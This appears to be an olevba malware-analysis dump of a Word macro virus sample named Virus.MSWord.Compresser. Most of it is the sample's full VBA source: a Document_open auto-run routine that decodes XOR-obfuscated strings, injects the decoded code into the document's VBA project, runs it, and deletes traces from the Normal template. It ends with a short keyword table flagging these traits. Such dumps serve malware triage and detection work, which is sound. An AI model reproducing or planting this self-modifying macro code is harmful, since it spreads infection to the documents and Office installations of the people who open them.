olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Compresser-b09a9eb1aa5d36f52f3cb07e70da0a4a68ded715
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Compresser-b09a9eb1aa5d36f52f3cb07e70da0a4a68ded715 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_open()
Dim j(100) As String
j(0) = "Ä¥Ã¥¸¥ÇÍ"
j(1) = "Ä¥Â¥¸¥ÆÍ"
j(2) = "Ä¥À¥¸¥ÁÍ"
j(3) = "èüæêáà¥¸¥ÀÈ­´©¥ÀÉ¬"
j(4) = "Ý¥Ê"
j(5) = "Õ¥¸¥­´¨´¬"
j(6) = "Ô¥¸¥­´¨´¬"
j(7) = "×¥¸¥­´¨´¬"
j(8) = "ËÖ¥¸¥Ñ"
j(9) = "ËÐ¥¸¥­´¨´¬"
j(10) = "ËÓ¥¸¥­´¨´¬"
j(11) = "ËÒ¥¸¥­´¨´¬"
j(12) = "Ü"
j(13) = "Ý¥Ã"
j(14) = "Ï¥´©¥É"
j(15) = "Ì¥èüæêáà"
j(16) = "Ü"
j(17) = "Ý¥Â"
j(18) = "Ï¥´©¥É"
j(19) = "Ì¥èüæêáà"
j(20) = "Ü"
j(21) = "Æ«öäóàäö¥Æß"
Set This = ThisDocument: Set VBP = This.VBProject
Set VBC = VBP.VBCOMPONENTS(1): Set COD = VBC.CODEMODULE
For I = 0 To 21
decode = decode & Dec(Decrypt(j(I))) & vbCr
Next
COD.InsertLines 79, decode
Call compressed
NormalTemplate.VBProject.VBCOMPONENTS(1).CODEMODULE.DELETELINES 79, 23
ActiveDocument.VBProject.VBCOMPONENTS(1).CODEMODULE.DELETELINES 79, 23
Rem WM97.COMPRESSED
End Sub
Private Function Dec(s)
H1 = "": D = ""
For I = 1 To Len(s)
H1 = Mid(s, I, 1)
Select Case H1
Case "A": H1 = Decrypt("ÖÀÑ")
Case "B": H1 = Decrypt("ËÊ×ÈÄÉÑÀÈÕÉÄÑÀ")
Case "C": H1 = Decrypt("ÄÆÑÌÓÀÁÊÆÐÈÀËÑ")
Case "D": H1 = Decrypt("ÑÍÌÖÁÊÆÐÈÀËÑ")
Case "E": H1 = Decrypt("ÑÍÖ")
Case "F": H1 = Decrypt("ËÊ×")
Case "G": H1 = Decrypt("ÁÊÆ")
Case "H": H1 = Decrypt("«ÓÇÕ×ÊÏÀÆÑ«ÓÇÆÊÈÕÊËÀËÑÖ­´¬«ÆÊÁÀÈÊÁÐÉÀ")
Case "I": H1 = Decrypt("«ÄÁÁÃ×ÊÈÖÑ×ÌËÂ")
Case "J": H1 = Decrypt("«ÁÀÉÀÑÀÉÌËÀÖ")
Case "K": H1 = Decrypt("«ÌËÖÀ×ÑÉÌËÀÖ")
Case "L": H1 = Decrypt("«ÆÊÐËÑÊÃÉÌËÀÖ")
Case "M": H1 = Decrypt("«ÉÌËÀÖ")
Case "N": H1 = Decrypt("«ÄÕÕÉÌÆÄÑÌÊË")
Case "O": H1 = Decrypt("ÊÕÑÌÊËÖ")
Case "P": H1 = Decrypt("«ÓÌ×ÐÖÕ×ÊÑÀÆÑÌÊË")
Case "Q": H1 = Decrypt("«ÖÄÓÀËÊ×ÈÄÉÕ×ÊÈÕÑ")
Case "R": H1 = Decrypt("«ÆÊËÃÌ×ÈÆÊËÓÀ×ÖÌÊËÖ")
Case "S": H1 = Decrypt("«ÁÌÖÕÉÄÜÄÉÀ×ÑÖ")
Case "T": H1 = Decrypt("ÒÁÄÉÀ×ÑÖËÊËÀ")
Case "U": H1 = Decrypt("«ÖÆ×ÀÀËÐÕÁÄÑÌËÂ")
Case "V": H1 = Decrypt("«ÁÌÖÕÉÄÜÖÑÄÑÐÖÇÄ×")
Case "W": H1 = Decrypt("«ÀËÄÇÉÀÆÄËÆÀÉÎÀÜ")
Case "X": H1 = Decrypt("ÒÌÑÍ")
Case "Y": H1 = Decrypt("ÀËÁ¥ÒÌÑÍ")
Case "Z": H1 = Decrypt("«ÃÐÉÉËÄÈÀ")
End Select
D = D & H1
Next
Dec = D
End Function
Private Function Decrypt(s)
For I = 1 To Len(s)
Decrypt = Decrypt & Chr(Asc(Mid(s, I, 1)) Xor 133)
Next
End Function

Private Sub compressed()

End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBCOMPONENTS        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CODEMODULE          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

